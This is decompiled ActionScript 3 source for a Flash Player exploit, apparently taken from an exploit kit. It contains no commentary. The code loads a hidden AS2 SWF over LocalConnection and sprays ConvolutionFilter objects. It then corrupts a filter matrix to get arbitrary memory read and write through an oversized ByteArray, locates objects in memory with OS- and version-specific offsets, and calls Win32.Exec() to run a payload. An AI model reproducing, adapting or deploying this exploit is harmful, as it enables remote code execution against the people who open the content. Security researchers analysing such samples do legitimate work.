package
{
   import flash.net.LocalConnection;
   import flash.filters.ConvolutionFilter;
   import flash.display.Loader;
   import flash.system.LoaderContext;
   import flash.system.ApplicationDomain;
   import flash.utils.*;
   import flash.net.FileReference;
   
   class C32 extends Utils
   {
      
      static var _lc:LocalConnection;
      
      static var _lcId:String;
      
      static var _cf:ConvolutionFilter;
      
      static var _vcf:Vector.<ConvolutionFilter>;
      
      static var _cnt:int;
      
      static var _ba:ByteArray;
      
      static var _vo:Vector.<Object>;
      
      static var _voAddr:uint;
      
      static var _vOffs:uint;
      
      static var _as2swf:Class = C32__as2swf;
       
      function C32()
      {
         super();
      }
      
      static function Init() : *
      {
         var as2:ByteArray = null;
         var ldr:Loader = null;
         var d:Date = null;
         try
         {
            _lc = new LocalConnection();
            _lc.client = {
               "start":function():*
               {
                  C32.Start();
               },
               "end":function():*
               {
                  C32.End();
               }
            };
            as2 = unzip("littleEndian",new _as2swf());
            ldr = new Loader();
            ldr.x = 402;
            ldr.y = 2;
            _gc.push(ldr);
            d = new Date();
            _lcId = "" + d.hours + d.minutes + (d.seconds >>> 2);
            try
            {
               _lc.connect("toAS3" + _lcId);
            }
            catch(e:Error)
            {
               _lc = null;
               return;
            }
            ldr.loadBytes(as2,new LoaderContext(false,ApplicationDomain.currentDomain));
            return;
         }
         catch(e:Error)
         {
            return;
         }
      }
      
      static function Start() : *
      {
         var _loc1_:uint = 0;
         var _loc2_:int = 0;
         try
         {
            if(_vsn < 20)
            {
               return;
            }
            if(!_lc)
            {
               return;
            }
            _cnt++;
            _loc1_ = 1044 - (Boolean(_dbg) && _cnt == 1?448:0);
            _vcf = new Vector.<ConvolutionFilter>(_loc1_);
            _gc.push(_vcf);
            _cf = new ConvolutionFilter(1,15,[u2f(1)]);
            _vcf[0] = _cf;
            _loc2_ = 1;
            while(_loc2_ < _loc1_)
            {
               _vcf[_loc2_] = new ConvolutionFilter(0,1);
               _loc2_++;
            }
            _lc.send("toAS2" + _lcId,"start");
            return;
         }
         catch(e:Error)
         {
            return;
         }
      }
      
      static function End() : *
      {
         var _loc1_:uint = 0;
         var _loc2_:int = 0;
         var _loc3_:Array = null;
         var _loc4_:uint = 0;
         var _loc5_:uint = 0;
         var _loc6_:* = undefined;
         var _loc7_:uint = 0;
         var _loc8_:uint = 0;
         var _loc9_:uint = 0;
         var _loc10_:uint = 0;
         var _loc11_:uint = 0;
         try
         {
            _cf.matrixX = 15;
            _loc1_ = _vcf.length;
            _loc2_ = 1;
            while(_loc2_ < _loc1_)
            {
               _vcf[_loc2_].matrixX = 1;
               _loc2_++;
            }
            _loc3_ = _cf.matrix;
            if(f2u(_loc3_[2 + 4]) >>> 16 != 4)
            {
               if(_cnt == 1)
               {
                  Start();
                  return;
               }
            }
            _loc3_ = new Array(1);
            _loc4_ = CfGet(1);
            _loc3_[0] = u2f(_loc4_ & 4294963200);
            _loc5_ = CfGet(7);
            _loc5_ = _loc5_ - (!!_dbg?1592:1444);
            CfSet(0,_loc5_);
            _loc6_ = new ConvolutionFilter(1,1);
            _loc7_ = CfGet(0);
            CfSet(0,0);
            _loc6_.matrix = _loc3_;
            _ba = new ByteArray();
            _loc3_[0] = u2f(_loc7_);
            _loc6_.matrix = _loc3_;
            CfSet2(0,0,4,263159);
            _loc2_ = 0;
            while(_loc2_ < 5)
            {
               _gc.push(new ConvolutionFilter(1,1));
               _loc2_++;
            }
            _gc.push(_loc6_,_ba);
            _ba.length = 291;
            _ba.endian = Endian.LITTLE_ENDIAN;
            _loc3_ = _cf.matrix;
            _loc1_ = _loc3_.length - 10;
            _loc2_ = 10;
            while(_loc2_ < _loc1_)
            {
               if(f2u(_loc3_[_loc2_]) == 291 && f2u(_loc3_[_loc2_ + 1]) == 291)
               {
                  _loc8_ = _loc2_ - 1;
                  _loc9_ = f2u(_loc3_[_loc8_]);
                  _loc10_ = _loc9_ ^ f2u(_loc3_[_loc8_ + 4]);
                  if((f2u(_loc3_[_loc8_ + 6]) ^ _loc10_) != 291)
                  {
                     _loc10_ = 0;
                  }
                  _loc3_[_loc8_] = 0;
                  if(_loc10_)
                  {
                     _loc3_[_loc8_ + 4] = u2f(0 ^ _loc10_);
                  }
                  _loc3_[_loc8_ + 2] = u2f(4294967295);
                  if(_loc10_)
                  {
                     _loc3_[_loc8_ + 6] = u2f(4294967295 ^ _loc10_);
                  }
                  _cf.matrix = _loc3_;
                  break;
               }
               _loc2_++;
            }
            if(!_loc8_)
            {
               Throw("");
            }
            _loc1_ = _ba.length;
            if(_loc1_ != 4294967295)
            {
               Throw("");
            }
            if(!FindAddr(_loc9_))
            {
               Throw("");
            }
            _loc11_ = GetAddr(_loc6_) + 32;
            _loc2_ = 0;
            while(_loc2_ < 16)
            {
               if(Get(_loc11_) == _loc5_)
               {
                  Set(_loc11_,0);
                  break;
               }
               _loc2_++;
               _loc11_ = _loc11_ + 4;
            }
            if(_win)
            {
               Win32.Exec();
            }
            _loc3_ = _cf.matrix;
            _loc3_[_loc8_] = u2f(_loc9_);
            if(_loc10_)
            {
               _loc3_[_loc8_ + 4] = u2f(_loc9_ ^ _loc10_);
            }
            _loc3_[_loc8_ + 2] = u2f(291);
            if(_loc10_)
            {
               _loc3_[_loc8_ + 6] = u2f(291 ^ _loc10_);
            }
            _cf.matrix = _loc3_;
            return;
         }
         catch(e:Error)
         {
            return;
         }
      }
      
      static function CfGet(param1:uint, param2:Array = null) : *
      {
         if(!param2)
         {
            param2 = _cf.matrix;
         }
         return f2u(param2[2 + param1]);
      }
      
      static function CfSet(param1:uint, param2:uint) : *
      {
         var _loc3_:* = _cf.matrix;
         _loc3_[2 + param1] = u2f(param2);
         _cf.matrix = _loc3_;
      }
      
      static function CfSet2(param1:uint, param2:uint, param3:uint, param4:uint) : *
      {
         var _loc5_:* = _cf.matrix;
         _loc5_[2 + param1] = u2f(param2);
         _loc5_[2 + param3] = u2f(param4);
         _cf.matrix = _loc5_;
      }
      
      static function Get(param1:uint) : uint
      {
         if(param1 < 4096 || param1 >= 3221225472)
         {
            Throw("");
         }
         _ba.position = param1;
         return _ba.readUnsignedInt();
      }
      
      static function Set(param1:uint, param2:uint) : *
      {
         if(param1 < 4096 || param1 >= 3221225472)
         {
            Throw("");
         }
         _ba.position = param1;
         _ba.writeUnsignedInt(param2);
      }
      
      static function GetAddr(param1:Object) : uint
      {
         _vo[1] = param1;
         return Get(_voAddr) - 1;
      }
      
      static function GetAddrV0(param1:Object) : uint
      {
         var _loc2_:uint = GetAddr(param1) + (!!_dbg?28:24);
         _loc2_ = Get(_loc2_);
         if(!_vOffs)
         {
            while(_vOffs < 50 && Get(_loc2_ + _vOffs) != param1[0])
            {
               _vOffs = _vOffs + 4;
            }
            if(_vOffs >= 50)
            {
               Throw("");
            }
         }
         return _loc2_ + _vOffs;
      }
      
      static function FindAddr(param1:*) : uint
      {
         var _loc2_:int = 0;
         var _loc3_:uint = 0;
         var _loc4_:uint = 0;
         var _loc5_:uint = 0;
         var _loc6_:uint = 0;
         var _loc7_:int = 0;
         var _loc8_:uint = 0;
         var _loc9_:int = 0;
         if(!_voAddr)
         {
            try
            {
               _loc4_ = param1 & 4294963200;
               _loc4_ = Get(_loc4_ + 28);
               if(_vsn <= 20)
               {
                  _loc4_ = _loc4_ - 2784;
                  _loc2_ = 0;
                  while(_loc2_ < 300)
                  {
                     if(Get(_loc4_) == 1016 && Get(_loc4_ + 4) == 4)
                     {
                        _loc3_ = Get(_loc4_ - (!!_dbg?36:32));
                        if(_loc3_ < 4096)
                        {
                           Throw("");
                        }
                        _loc3_ = Get(_loc3_ + 4);
                        break;
                     }
                     _loc2_++;
                     _loc4_ = _loc4_ - 4;
                  }
               }
               else
               {
                  if(_osx)
                  {
                     _loc4_ = _loc4_ + 550 * 4;
                  }
                  else
                  {
                     _loc4_ = _loc4_ - 700 * 4;
                  }
                  _loc5_ = !!_osx?uint(1352):uint(672);
                  _loc6_ = !!_osx?uint(3):uint(6);
                  _loc2_ = 0;
                  while(_loc2_ < 200)
                  {
                     if(Get(_loc4_) == _loc5_ && Get(_loc4_ - 4) == _loc6_)
                     {
                        _loc8_ = _loc4_ + 12;
                        while(_loc7_ < 4)
                        {
                           _gc.push(new FileReference());
                           _loc4_ = Get(_loc8_);
                           if(_loc4_)
                           {
                              break;
                           }
                           _loc7_++;
                        }
                        if(!_loc4_)
                        {
                           return 0;
                        }
                        _loc4_ = Get(_loc4_ + 4);
                        if((_loc4_ & 4095) > _loc5_)
                        {
                           _loc4_ = _loc4_ - _loc5_;
                           _loc3_ = Get(_loc4_ + 4);
                        }
                        break;
                     }
                     _loc2_++;
                     _loc4_ = _loc4_ - 4;
                  }
               }
               if(_loc3_ < 4096)
               {
                  return 0;
               }
               _vo = new Vector.<Object>(192 / 4 - 2);
               _vo[0] = 17965872 + 6 >>> 3;
               _vo[4] = 17965872 + 6 >>> 3;
               _loc3_ = _loc3_ + (_vsn <= 20?1616:1904);
               _loc2_ = 0;
               while(_loc2_ < 40 && !_voAddr)
               {
                  _loc4_ = Get(_loc3_);
                  if(Get(_loc4_ + 8 * 4) == 192)
                  {
                     _loc4_ = Get(_loc3_ + 4);
                     if(Get(_loc4_ + 8 * 4) == 192)
                     {
                        _loc4_ = Get(_loc4_ + 2 * 4);
                        if(_loc4_ < 4096)
                        {
                           Throw("");
                        }
                        while(_loc9_ < 976)
                        {
                           if(Get(_loc4_) == 17965878 && Get(_loc4_ + 4 * 4) == 17965878)
                           {
                              _voAddr = _loc4_ + 4;
                              break;
                           }
                           _loc9_++;
                           _loc4_ = _loc4_ + 4;
                        }
                        break;
                     }
                  }
                  _loc2_++;
                  _loc3_ = _loc3_ + 4;
               }
            }
            catch(e:Error)
            {
            }
         }
         return _voAddr;
      }
   }
}
